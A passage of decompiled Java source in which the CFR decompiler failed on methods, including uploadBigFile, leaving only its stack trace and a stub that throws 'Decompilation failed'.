         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:538)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         *     at async.DecompilerRunnable.cfrDecompilation(DecompilerRunnable.java:348)
         *     at async.DecompilerRunnable.call(DecompilerRunnable.java:309)
         *     at async.DecompilerRunnable.call(DecompilerRunnable.java:31)
         *     at java.util.concurrent.FutureTask.run(FutureTask.java:266)
         *     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
         *     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
         *     at java.lang.Thread.run(Thread.java:750)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    /*
     * Exception decompiling
     */
    public boolean uploadBigFile(String uploadFileString, File selectdFile) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK], 5[WHILELOOP], 3[CATCHBLOCK], 6[UNCONDITIONALDOLOOP]], but top level block is 2[TRYBLOCK]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:538)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         *     at async.DecompilerRunnable.cfrDecompilation(DecompilerRunnable.java:348)
         *     at async.DecompilerRunnable.call(DecompilerRunnable.java:309)
         *     at async.DecompilerRunnable.call(DecompilerRunnable.java:31)
         *     at java.util.concurrent.FutureTask.run(FutureTask.java:266)
         *     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
         *     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
         *     at java.lang.Thread.run(Thread.java:750)
         */
        throw new IllegalStateException("Decompilation failed");
    }
}

